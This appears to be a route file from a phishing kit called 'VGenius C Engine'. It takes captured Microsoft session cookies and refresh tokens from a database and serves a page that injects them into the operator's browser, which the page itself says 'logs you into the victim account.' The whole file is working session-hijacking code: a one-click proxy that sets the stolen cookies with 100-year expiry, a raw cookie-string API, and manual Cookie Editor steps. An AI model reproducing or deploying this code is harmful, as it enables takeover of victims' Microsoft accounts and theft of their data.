/**
 * VGenius C Engine - Cookie Injection Routes
 * Provides working cookie injection via server-side proxy redirect
 */
const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// ─── Cookie Injection Page ──────────────────────────────────────
router.get('/page/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).send('No tokens available');
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    if (cookiesList.length === 0) return res.status(400).send('No cookies available');

    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var jwt = req.query.jwt || '';

    res.type('html').send(generateInjectPage(cookiesList, clientId, tenant, jwt));
  } catch (err) {
    console.error('[CookieInject] Page error:', err);
    res.status(500).send('Server error');
  }
});

// ─── Direct Cookie String API ──────────────────────────────────────
router.get('/raw/:id', async (req, res) => {
  try {
    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });

    let decoded;
    try {
      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
    } catch (err) {
      return res.status(401).json({ error: 'Invalid or expired token' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, decoded.user_id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }

    var cookieString = '';
    var expires = new Date();
    expires.setFullYear(expires.getFullYear() + 100);
    var expStr = expires.toUTCString();

    for (var i = 0; i < cookiesList.length; i++) {
      var c = cookiesList[i];
      cookieString += c.name + '=' + encodeURIComponent(c.value);
      cookieString += '; domain=' + (c.domain || '.login.microsoftonline.com');
      cookieString += '; path=/; ';
      cookieString += 'expires=' + expStr + '; ';
      cookieString += 'SameSite=None; Secure; ';
    }

    res.json({
      success: true,
      cookie_string: cookieString.trim().slice(0, -2),
      cookie_count: cookiesList.length,
      cookies: cookiesList
    });
  } catch (err) {
    console.error('[CookieInject] Raw error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Parse Cookie String ───────────────────────────────────────────
function parseCookies(cookieString) {
  if (!cookieString) return [];

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');

    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      if (nameLower === 'expires' ||
          nameLower === 'max-age' ||
          nameLower === 'domain' ||
          nameLower === 'path' ||
          nameLower === 'secure' ||
          nameLower === 'httponly' ||
          nameLower.startsWith('samesite=')) {
        continue;
      }

      if (!value || value.length === 0) continue;

      seenNames[nameLower] = {
        name: name,
        value: value,
        domain: '.login.microsoftonline.com'
      };
    }
  }

  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }

  return cookies;
}

// ─── Generate Cookie Injection Page ────────────────────────────────
function generateInjectPage(cookies, clientId, tenant, jwtToken) {
  var cookieJson = JSON.stringify(cookies);
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += ' <meta charset="UTF-8">\n';
  html += ' <title>VGenius Cookie Injector</title>\n';
  html += ' <style>\n';
  html += '   body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #0a0a1a; color: #e0e0e0; }\n';
  html += '   button { padding: 12px 24px; cursor: pointer; background: #00ccff; color: #000; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; margin: 10px 5px; }\n';
  html += '   button:hover { background: #00aacc; }\n';
  html += '   button:disabled { background: #555; color: #999; cursor: not-allowed; }\n';
  html += '   .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
  html += '   .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
  html += '   .error { background: #2a0a0a; color: #f00; border: 1px solid #f00; }\n';
  html += '   .info { background: #0a0a2a; color: #00f; border: 1px solid #00f; }\n';
  html += '   pre { background: #111; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 11px; color: #0f0; word-break: break-all; }\n';
  html += '   .step { margin: 20px 0; padding: 15px; border: 1px solid #333; border-radius: 8px; }\n';
  html += '   .step h3 { margin-top: 0; color: #00ccff; }\n';
  html += ' </style>\n';
  html += '</head>\n<body>\n';
  html += ' <h1 style="color:#00ccff">VGenius Session Cookie Injector</h1>\n';
  html += ' <p>This page injects Microsoft session cookies and logs you into the victim account.</p>\n';
  html += ' <p><strong>Cookies available:</strong> ' + cookies.length + '</p>\n\n';

  // Method 1: One-click injection via server proxy
  html += ' <div class="step">\n';
  html += '   <h3>Method 1: One-Click Injection</h3>\n';
  html += '   <p>Click below. Your browser will visit our proxy which sets the cookies and redirects to Microsoft login.</p>\n';
  html += '   <button id="injectBtn" onclick="startInjection()">Inject Cookies & Login Now</button>\n';
  html += '   <div id="status"></div>\n';
  html += ' </div>\n\n';

  // Method 2: Manual method
  html += ' <div class="step">\n';
  html += '   <h3>Method 2: Manual Cookie Injection</h3>\n';
  html += '   <p>If Method 1 does not work, use a cookie editor extension:</p>\n';
  html += '   <ol>\n';
  html += '     <li>Install <a href="https://chrome.google.com/webstore/detail/cookie-editor/hlojalnbgnpgkeaafohfifofhlkjunhj" target="_blank" style="color:#00ccff">Cookie Editor</a></li>\n';
  html += '     <li>Go to <a href="https://login.microsoftonline.com" target="_blank" style="color:#00ccff">login.microsoftonline.com</a></li>\n';
  html += '     <li>Open Cookie Editor and paste these cookies:</li>\n';
  html += '   </ol>\n';
  html += '   <pre id="manualCookies"></pre>\n';
  html += '   <button onclick="copyManualCookies()">Copy to Clipboard</button>\n';
  html += ' </div>\n\n';

  html += ' <script>\n';
  html += '   var cookies = ' + cookieJson + ';\n';
  html += '   var statusEl = document.getElementById("status");\n';
  html += '   var injectBtn = document.getElementById("injectBtn");\n\n';

  // Show manual cookies
  html += '   function showManualCookies() {\n';
  html += '     var lines = [];\n';
  html += '     for (var i = 0; i < cookies.length; i++) {\n';
  html += '       lines.push(cookies[i].name + "=" + cookies[i].value);\n';
  html += '     }\n';
  html += '     document.getElementById("manualCookies").textContent = lines.join("\\n");\n';
  html += '   }\n';
  html += '   showManualCookies();\n\n';

  // Copy manual cookies
  html += '   function copyManualCookies() {\n';
  html += '     var text = document.getElementById("manualCookies").textContent;\n';
  html += '     navigator.clipboard.writeText(text).then(function() {\n';
  html += '       alert("Cookies copied!\\n\\nSteps:\\n1. Go to https://login.microsoftonline.com\\n2. Open Cookie Editor extension\\n3. Click Paste\\n4. Refresh the page");\n';
  html += '     }).catch(function() {\n';
  html += '       prompt("Copy these cookies manually:", text);\n';
  html += '     });\n';
  html += '   }\n\n';

  // Main injection function — direct redirect to proxy
  html += '   function startInjection() {\n';
  html += '     injectBtn.disabled = true;\n';
  html += '     injectBtn.textContent = "Redirecting...";\n';
  html += '     setStatus("Setting up secure cookie injection...", "info");\n\n';

  // Build proxy URL with all cookie data
  html += '     var proxyUrl = "/api/tokens/inject/proxy?cookies=" + encodeURIComponent(JSON.stringify(cookies));\n';
  html += '     proxyUrl += "&tenant=' + tenant + '&client_id=' + clientId + '";\n\n';

  // Use an iframe to trigger the cookie-setting redirect without losing the current page context
  html += '     var iframe = document.createElement("iframe");\n';
  html += '     iframe.style.display = "none";\n';
  html += '     iframe.src = proxyUrl;\n';
  html += '     document.body.appendChild(iframe);\n\n';

  html += '     setStatus("Cookies being injected... Redirecting to Microsoft login in 2 seconds.", "success");\n';
  html += '     setTimeout(function() {\n';
  html += '       window.location.href = "https://login.microsoftonline.com/' + tenant + '/";\n';
  html += '     }, 2000);\n';
  html += '   }\n\n';

  html += '   function setStatus(msg, type) {\n';
  html += '     statusEl.className = "status " + type;\n';
  html += '     statusEl.innerHTML = msg;\n';
  html += '   }\n';
  html += ' </script>\n';
  html += '</body>\n</html>';

  return html;
}

// ─── Cookie Injection Proxy Endpoint ──────────────────────────────
// Sets cookies via Set-Cookie headers then redirects to Microsoft login
router.get('/proxy', async (req, res) => {
  try {
    var cookiesStr = req.query.cookies || '';
    var tenant = req.query.tenant || 'common';
    var clientId = req.query.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

    if (!cookiesStr) return res.status(400).json({ error: 'No cookies provided', success: false });

    var cookies = JSON.parse(decodeURIComponent(cookiesStr));
    var expires = new Date();
    expires.setFullYear(expires.getFullYear() + 100);
    var expStr = expires.toUTCString();

    // Build Set-Cookie headers for each cookie
    var cookieHeaders = [];
    for (var i = 0; i < cookies.length; i++) {
      var c = cookies[i];
      var domain = c.domain || '.login.microsoftonline.com';
      var cookieHeader = c.name + '=' + encodeURIComponent(c.value) + '; ' +
        'Domain=' + domain + '; ' +
        'Path=/; ' +
        'Expires=' + expStr + '; ' +
        'SameSite=None; ' +
        'Secure';
      cookieHeaders.push(cookieHeader);
    }

    // Set cookies via Set-Cookie headers and redirect to Microsoft
    res.set('Set-Cookie', cookieHeaders);
    res.redirect('https://login.microsoftonline.com/' + tenant + '/');
  } catch (err) {
    console.error('[CookieInject] Proxy error:', err);
    res.status(500).json({ error: 'Proxy failed: ' + err.message, success: false });
  }
});

module.exports = router;
